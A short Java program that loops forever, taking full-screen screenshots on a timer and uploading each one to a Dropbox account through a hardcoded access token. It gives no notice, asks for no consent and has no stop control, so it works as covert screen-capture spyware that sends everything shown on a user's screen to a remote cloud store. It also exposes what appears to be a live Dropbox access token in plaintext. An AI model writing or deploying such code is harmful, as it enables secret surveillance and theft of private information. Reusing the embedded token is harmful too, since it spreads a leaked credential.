import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import javax.print.DocFlavor;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws AWTException, InterruptedException {
        String ACCESS_TOKEN = "sl.AmrWbTVx_atJLEdhBZ-CAbWX8ng6Crvehm6clVP7tZgzXnuNyudd3etN7Oa2DIFCe3m9jIGnIBp8HGP1VOUk0B7GxefdBf16AriNB8vVRkmkrq3JPfOZ_dFHpAN51yCqN7T6qZA";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        MyThread timer;

        BufferedImage img = null;


        for (; ; ) {


            try {
                timer = new MyThread();
                timer.start();
                timer.join();
                img = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String date = format.format(new Date());



                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(img, "png", os);
                byte[] bytes = os.toByteArray();

                InputStream in = new ByteArrayInputStream(bytes);
                client.files().uploadBuilder("/" + date + ".png")
                        .uploadAndFinish(in);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}


